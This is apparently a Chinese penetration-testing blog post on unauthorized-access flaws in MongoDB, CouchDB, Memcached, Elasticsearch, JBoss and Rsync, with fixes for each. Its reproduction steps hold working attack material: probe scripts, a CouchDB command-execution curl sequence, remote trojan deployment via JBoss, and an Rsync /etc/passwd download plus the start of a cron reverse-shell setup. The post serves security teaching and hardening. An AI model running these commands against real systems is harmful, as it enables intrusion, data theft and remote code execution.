<!DOCTYPE html>
<html lang="en">

<!-- Head tag (contains Google-Analytics、Baidu-Tongji)-->
<head>
  <!-- Google Analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxx-xx"></script>
  <script type="text/javascript">
    window.dataLayer = window.dataLayer || [];

    function gtag() {
      dataLayer.push(arguments);
    }
    gtag('js', new Date());

    gtag('config', 'UA-xxxxxx-xx');
  </script>
  

  <!-- Baidu Tongji -->
  
  <script type="text/javascript">
    // Originial
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>
  

  <!-- Baidu Push -->
  
  <script>
    (function() {
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      } else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
    })();
  </script>
  

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />

  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc" />
  <meta name="baidu-site-verification" content="PpzM9WxOJU" />

  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="It&#39;s an IT blog..." />
  <meta name="keyword" content="v-vincen,v-vincen,livemylife,IT  blog,Blog" />
  <link rel="shortcut icon" href="/img/avatar/superman.jpg" />

  <!-- Place this tag in your head or just before your close body tag. -->
  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>
  <!-- Bootstrap Core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.min.css" />

  <!-- Custom CSS -->
  <link rel="stylesheet" href="/css/beantech.min.css" />

  <!-- Pygments Highlight CSS -->
  
<link rel="stylesheet" href="../../../../css/highlight.css">
<link rel="stylesheet" href="../../../../css/widget.css">
<link rel="stylesheet" href="../../../../css/rocket.css">
<link rel="stylesheet" href="../../../../css/signature.css">
<link rel="stylesheet" href="../../../../css/catalog.css">
<link rel="stylesheet" href="../../../../css/livemylife.css">


  
  <!-- wave start -->
  <link rel="stylesheet" href="/css/wave.css" />
  <!-- wave end -->
  

  
  <!-- top start (article top hot config) -->
  <link rel="stylesheet" href="/css/top.css" />
  <!-- top end -->
  

  
  <!-- ThemeColor start -->
  <link rel="stylesheet" href="/css/scroll.css" />
  <!-- ThemeColor end -->
  

  
  <!-- viewer start (Picture preview) -->
  <link rel="stylesheet" href="/css/viewer.min.css" />
  <!-- viewer end -->
  

  
  <!-- Search start -->
  <link rel="stylesheet" href="/css/search.css" />
  <!-- Search end -->
  

  
  <!-- ThemeColor start -->
  <link rel="stylesheet" href="/css/themecolor.css" />
  <!-- ThemeColor end -->
  

  

  

  <!-- Custom Fonts -->
  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
  <!-- Hux change font-awesome CDN to qiniu -->
  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
    href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->

  <!-- ga & ba script hoook -->
  <link rel="canonical" href="https://www.tattooo.top/2020/12/11/常见未授权访问漏洞/">
  <title>
    
    常见未授权访问漏洞 - Tattoo&#39;s Blog
    
  </title>
<meta name="generator" content="Hexo 4.2.1"></head>


<!-- hack iOS CSS :active style -->

<body ontouchstart="" class="body--home">
	<!-- ThemeColor -->
	
	<!-- ThemeColor -->
<!-- <div class="toggle" onclick="document.body.classList.toggle('body--dark')">Switch Color</div> -->

<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
  <i class="mdui-icon material-icons bright-mode"></i>
  <i class="mdui-icon material-icons dark-mode"></i>
</div>

	

	<!-- Gitter -->
	
	<!-- Gitter -->
<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
<script>
  ((window.gitter = {}).chat = {}).options = {
    room: 'your-community/your-room'
  };
</script>
<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

	

	<!-- Navigation (contains search)-->
	<!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
  <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header page-scroll">
      <button type="button" class="navbar-toggle">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">Live My Life</a>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <!-- Known Issue, found by Hux:
            <nav>'s height woule be hold on by its content.
            so, when navbar scale out, the <nav> will cover tags.
            also mask any touch event of tags, unfortunately.
        -->
    <div id="huxblog_navbar">
      <div class="navbar-collapse">
        <ul class="nav navbar-nav navbar-right">
          <li>
            <a href="/">Home</a>
          </li>

          

          
          

          
          <li>
            <a href="/archive/">Archives</a>
          </li>
          
          

          
          <li>
            <a href="/about/">About</a>
          </li>
          
          

          
          <li>
            <a href="/categories/">Categories</a>
          </li>
          
          

          
          <li>
            <a href="/tags/">Tags</a>
          </li>
          
          

          
          <li><a class="popup-trigger" title="Search"><span class="search-icon"></span>Search</a></li>
          
        </ul>
      </div>
    </div>
    <!-- /.navbar-collapse -->
  </div>
  <!-- /.container -->
</nav>
<!-- progress -->
<div id="progress">
  <div class="line" style="width: 0%;"></div>
</div>


<script>
  // Drop Bootstarp low-performance Navbar
  // Use customize navbar with high-quality material design animation
  // in high-perf jank-free CSS3 implementation
  var $body = document.body;
  var $toggle = document.querySelector('.navbar-toggle');
  var $navbar = document.querySelector('#huxblog_navbar');
  var $collapse = document.querySelector('.navbar-collapse');

  $toggle.addEventListener('click', handleMagic)

  function handleMagic(e) {
    if ($navbar.className.indexOf('in') > 0) {
      // CLOSE
      $navbar.className = " ";
      // wait until animation end.
      setTimeout(function() {
        // prevent frequently toggle
        if ($navbar.className.indexOf('in') < 0) {
          $collapse.style.height = "0px"
        }
      }, 400)
    } else {
      // OPEN
      $collapse.style.height = "auto"
      $navbar.className += " in";
    }
  }
</script>


	<!-- Post Header (contains intro-header、signature、wordcount、busuanzi、waveoverlay) -->
	<!-- Modified by Yu-Hsuan Yen -->
<!-- Post Header -->

  <style type="text/css">
    header.intro-header {
       /*post*/
        background-image: url('/img/header_img/lml_bg.jpg');
      
    }

    
  </style>





<header class="intro-header">
  <!-- Signature -->
  <div id="signature">
    <div class="container">
      <div class="row">
        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
          
          <div class="post-heading">
            <div class="tags">
              
            </div>
            <h1>常见未授权访问漏洞</h1>
            <h2 class="subheading"></h2>
            <span class="meta">
              Posted by Tattoo on
              2020-12-11
            </span>


            
            <!-- WordCount start -->
            <div class="blank_box"></div>
            <span class="meta">
              Estimated Reading Time <span class="post-count">15</span> Minutes
            </span>
            <div class="blank_box"></div>
            <span class="meta">
              Words <span class="post-count">3.9k</span> In Total
            </span>
            <div class="blank_box"></div>
            <!-- 不蒜子统计 start -->
            <span class="meta">
              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
            </span>
            <!-- 不蒜子统计 end -->
            <!-- WordCount end -->
            


          </div>
          
        </div>
      </div>
    </div>
  </div>

  
  <!-- waveoverlay start -->
  <div class="preview-overlay">
    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
      <defs>
        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
      </defs>
      <g class="preview-parallax">
        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
      </g>
    </svg>
  </div>
  <!-- waveoverlay end -->
  

</header>



	<!-- Main Content (Post contains
	Pager、
	tip、
	socialshare、
	gitalk、gitment、disqus-comment、
	Catalog、
	Sidebar、
	Featured-Tags、
	Friends Blog、
	anchorjs、
	) -->
	<!-- Modify by Yu-Hsuan Yen -->
<!-- Post Content -->
<article>
  <div class="container">
    <div class="row">
      <!-- Post Container -->
      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">

        <h1 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h1><h2 id="MongoDB未授权访问漏洞"><a href="#MongoDB未授权访问漏洞" class="headerlink" title="MongoDB未授权访问漏洞"></a>MongoDB未授权访问漏洞</h2><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>MongoDB服务默认未开启权限验证，若启动mongodb服务时，未设置<code>--auth</code>参数（添加账号密码），则攻击者无需密码（默认空口令）可直接操作数据库，默认端口27017</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><ol>
<li>使用高交互shell连接mongodb</li>
</ol>
<p>执行<code>show dbs</code>命令，无报错信息，列表存在默认库<code>local</code>库，则判断存在未授权访问（local库即便删除，重启mongodb后仍会生成）</p>
<ul>
<li>NoSQLBooster或robot3t</li>
</ul>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1.png" alt=""></p>
<ol start="2">
<li>python脚本探测</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mongodb</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		client = pymongo.MongoClient(ip,port)</span><br><span class="line">		db=client.local</span><br><span class="line">		flag = db.collection_names()</span><br><span class="line">		<span class="keyword">if</span> flag:</span><br><span class="line">			<span class="keyword">print</span> db</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"[+] Mongodb login for anonymous"</span></span><br><span class="line">	<span class="keyword">except</span> Exception,e:</span><br><span class="line">		<span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">mongodb(<span class="string">'ip'</span>,<span class="number">27017</span>)</span><br></pre></td></tr></table></figure>

<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>添加认证</li>
</ol>
<ul>
<li>启动服务时，添加<code>--auth</code>参数</li>
<li>添加用户</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use admin</span><br><span class="line">db.addUser(<span class="string">"admin"</span> <span class="string">"password"</span>)</span><br><span class="line">db.auth(<span class="string">"admin"</span>,<span class="string">"password"</span>)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>本地监听</li>
</ol>
<ul>
<li>如非必要，建议只在本地开启监听服务，只能本机访问mongodb，使用参数<code>--bind_ip 127.0.0.1</code>绑定地址，或在 /etc/mongodb.conf 文件中添加以下内容<code>bind_ip = 127.0.0.1</code></li>
</ul>
<h2 id="CouchDB未授权访问漏洞（任意命令执行）"><a href="#CouchDB未授权访问漏洞（任意命令执行）" class="headerlink" title="CouchDB未授权访问漏洞（任意命令执行）"></a>CouchDB未授权访问漏洞（任意命令执行）</h2><h5 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>配置文件<code>local.ini</code>中的配置项<code>query_server</code>允许用户指定一个二进制程序或脚本与CouchDB进行数据交互和处理，并且还提供了一个API接口用来动态修改配置属性，通过修改<code>query_servers</code>配置，引入外部二进制程序来执行命令，默认端口5984</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/2.png" alt=""></p>
<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p><strong>nmap扫描检测couchdb</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -<span class="selector-tag">p</span> <span class="number">5984</span> —script couchdb-stats<span class="selector-class">.nse</span> ip</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3.png" alt=""></p>
<p><strong>未授权访问测试</strong></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/4.png" alt=""></p>
<p><strong>任意命令执行</strong></p>
<p>该漏洞需要登录用户才可触发，利用<code>CVE-2017-12635</code>垂直权限绕过创建一个账号密码<code>vulhub:vulhub</code></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5.png" alt=""></p>
<ol>
<li><p>调用API接口，新增一个名为<code>cmd</code>的<code>query_servers</code>配置，写入要执行的命令<code>id &gt; /tmp/success</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">'http://vulhub:vulhub@ip:5984/_config/query_servers/cmd'</span> -d <span class="string">'"id &gt;/tmp/success"'</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>新建一个数据库<code>couchtest</code>和表<code>couch</code>，插入一条记录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">'http://vulhub:vulhub@ip:5984/couchtest'</span></span><br><span class="line">curl -X PUT <span class="string">'http://vulhub:vulhub@ip:5984/couchtest/couch'</span> -d <span class="string">'&#123;"_id":"770895a97726d5ca6d70a22173005c7b"&#125;'</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>调用<code>query_servers</code>处理数据，即查询数据库<code>couchtest</code>，将<code>language</code>设置为<code>cmd</code>，就会用到刚才配置的<code>query_servers</code>，从而触发命令执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">'http://vulhub:vulhub@ip:5984/couchtest/_temp_view?limit=10'</span> -d <span class="string">'&#123;"language":"cmd","map":""&#125;'</span> -H <span class="string">'Content-Type:application/json'</span></span><br></pre></td></tr></table></figure>


</li>
</ol>
<p>命令成功执行</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/6.png" alt=""></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/7.png" alt=""></p>
<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li><p>绑定本地ip</p>
<p>在<code>/etc/couchdb/local.ini</code>文件中修改<code>bind_address = 0.0.0.0</code>为<code>bind_address = 127.0.0.1</code>，重启生效后，外网无法访问</p>
</li>
<li><p>设置访问密码</p>
<p>在<code>/etc/couchdb/local.ini</code>文件中找到<code>[admins]</code>字段并配置密码</p>
</li>
</ol>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8.png" alt=""></p>
<h2 id="Memcached未授权访问漏洞"><a href="#Memcached未授权访问漏洞" class="headerlink" title="Memcached未授权访问漏洞"></a>Memcached未授权访问漏洞</h2><h5 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>自身的安全设计缺陷没有权限控制模块，客户端连接 Memcached 服务器后无需认证就可读取、修改服务器缓存内容，默认端口11211</p>
<h5 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p><strong>nmap扫描检测Memcache</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 11211 --script memcached-info 192.168.120.71</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/9.png" alt=""></p>
<p><strong>未授权访问测试</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.120.71 11211</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/10.png" alt=""></p>
<p>或</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv 192.168.120.71 11211</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/11.png" alt=""></p>
<p><strong><code>stats</code>查看memcache服务状态</strong></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/12.png" alt=""></p>
<h5 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li><p>绑定本地ip</p>
<p>启动服务时，使用<code>-l 127.0.0.1</code>参数指定监听地址，只允许本地访问</p>
</li>
<li><p>配置访问控制</p>
<p>通过安全组规则或防火墙配置访问控制规则，禁止访问11211端口</p>
</li>
<li><p>修改默认端口</p>
</li>
<li><p>最小权限运行服务</p>
</li>
</ol>
<h2 id="ElasticSearch未授权访问漏洞"><a href="#ElasticSearch未授权访问漏洞" class="headerlink" title="ElasticSearch未授权访问漏洞"></a>ElasticSearch未授权访问漏洞</h2><h5 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300端口的服务器进行恶意攻击</p>
<h5 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p><strong>python脚本探测</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Elasticsearch_check</span><span class="params">(ip, port=<span class="number">9200</span>, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">		url = <span class="string">"http://"</span>+ip+<span class="string">":"</span>+str(port)+<span class="string">"/_cat"</span></span><br><span class="line">		response = requests.get(url) </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"/_cat/master"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[+] Elasticsearch Unauthorized: '</span> +ip+<span class="string">':'</span>+str(port)</span><br><span class="line">        </span><br><span class="line">Elasticsearch_check(<span class="string">"127.0.0.1"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/13.png" alt=""></p>
<p><strong>未授权访问测试</strong></p>
<ol>
<li><p>查询节点数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:9200&#x2F;_nodes</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/14.png" alt=""></p>
</li>
<li><p>获取所有的index</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:9200&#x2F;_cat&#x2F;indices?v</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/15.png" alt=""></p>
</li>
</ol>
<h5 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li><p>绑定固定ip</p>
<p>访问控制策略，限制IP访问</p>
</li>
<li><p>设置认证</p>
<p>在<code>config/elasticsearch.yml</code>中为9200端口设置认证等</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">http.basic.enabled</span> <span class="literal">true</span> <span class="comment">#开关，开启会接管全部HTTP连接</span></span><br><span class="line"><span class="string">http.basic.user</span> <span class="string">"admin"</span> <span class="comment">#账号</span></span><br><span class="line"><span class="string">http.basic.password</span> <span class="string">"admin_pw"</span> <span class="comment">#密码</span></span><br><span class="line"><span class="string">http.basic.ipwhitelist</span> <span class="string">["localhost",</span> <span class="string">"127.0.0.1"</span><span class="string">]</span>	<span class="comment">#本地地址</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="JBoss未授权访问漏洞"><a href="#JBoss未授权访问漏洞" class="headerlink" title="JBoss未授权访问漏洞"></a>JBoss未授权访问漏洞</h2><h5 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>默认情况下，访问<code>http://ip:8080/jmx-console</code>就可以进入管理控制台，不需要用户名和密码，可以通过脚本命令执行系统命令，如反弹shell，部署上传木马等</p>
<h5 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>访问<code>jmx-console</code>进入控制台，然后进入<code>jboss.deployment</code>，使用addURL()函数，远程部署木马</p>
<p>将war包放到服务器上</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/16.png" alt=""></p>
<p>填写木马远程URL并调用</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/17.png" alt=""></p>
<p>访问<code>http://ip/war包名/war包内文件</code></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/19.png" alt=""></p>
<h5 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>对jmx控制页面访问添加访问验证，设置强口令</li>
<li>关闭JMX Console和Web Console</li>
</ol>
<h2 id="Rsync-未授权访问漏洞"><a href="#Rsync-未授权访问漏洞" class="headerlink" title="Rsync 未授权访问漏洞"></a>Rsync 未授权访问漏洞</h2><h5 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患，Rsync 默认端口为 837</p>
<h5 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>vulhub环境搭建，使用原始Dockerfile搭建会报错</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/err.png" alt=""></p>
<p>修改Dockerfile如下</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/20.png" alt=""></p>
<p><code>docker-compose build</code></p>
<p><code>docker-compose up -d</code></p>
<p><strong>nmap扫描rsync服务</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 873 --script rsync-list-modules your-ip</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/21.png" alt=""></p>
<p><strong>查看目录中的文件</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://your-ip/src</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/22.png" alt=""></p>
<p><strong>任意文件下载</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://your-ip/src/etc/passwd ./passwd.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/23.png" alt=""></p>
<p><strong>利用cron定时任务反弹shell</strong></p>
<p>可以选择写入webshell或者shh公钥</p>
<p>下载crontab文件，查看定时任务</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync:<span class="regexp">//y</span>our-ip<span class="regexp">/src/</span>etc<span class="regexp">/crontab ./</span></span><br></pre></td></tr></table></figure>


<p>表示每小时的第17分钟执行run-parts –report /etc/cron.hourly</p>
